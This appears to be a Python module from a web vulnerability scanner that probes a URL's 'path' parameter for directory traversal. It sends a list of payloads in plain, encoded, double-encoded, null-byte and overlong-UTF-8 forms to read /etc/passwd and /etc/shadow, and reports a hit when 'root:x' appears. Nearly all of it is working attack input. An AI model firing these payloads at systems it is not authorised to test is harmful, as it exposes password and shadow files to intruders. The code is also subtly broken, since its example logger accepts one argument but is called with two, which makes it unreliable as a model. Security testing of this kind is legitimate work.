import requests

def check_directory_traversal(url, user_agent, create_log):
    traversal_payloads = [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../etc/hosts",
        "../../../../etc/hostname",
        "../../../../etc/issue",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "../../../../etc/passwd%00",
        "../../../../etc/shadow%00",
        "../../../../etc/passwd%20",
        "../../../../etc/shadow%20",
        "../../../../etc/passwd.txt",
        "../../../../etc/passwd.bak",
        "....//....//....//....//etc/passwd",
        "....//....//....//....//etc/shadow",
        "%c0%af%c0%af%c0%af%c0%af%c0%af%c0%af%c0%af%c0%afetc/passwd",
        "%c0%af%c0%af%c0%af%c0%af%c0%af%c0%af%c0%af%c0%afetc/shadow"
    ]
    try:
        headers = {'User-Agent': user_agent}
        for payload in traversal_payloads:
            test_url = f"{url}?path={payload}"
            response = requests.get(test_url, headers=headers)
            
            # Check for potential indicators of a directory traversal vulnerability
            if "root:x" in response.text or "[extensions]" in response.text:
                create_log(f"\n[!] Directory Traversal vulnerability detected at {test_url}","red")
            else:
                create_log(f"\n[-] No Directory Traversal vulnerability found using {payload}","green4")
    except requests.exceptions.RequestException as e:
        create_log(f"\n[!]An error occurred while checking Directory Traversal: {e}","red")

# Example usage in the main scanning function
if __name__ == "__main__":
    def create_log(message):
        print(message)

    starting_url = "http://example.com"  # Replace with the starting URL
    user_agent = "Mozilla/5.0"

    # Call your functions here
    check_directory_traversal(starting_url, user_agent, create_log)
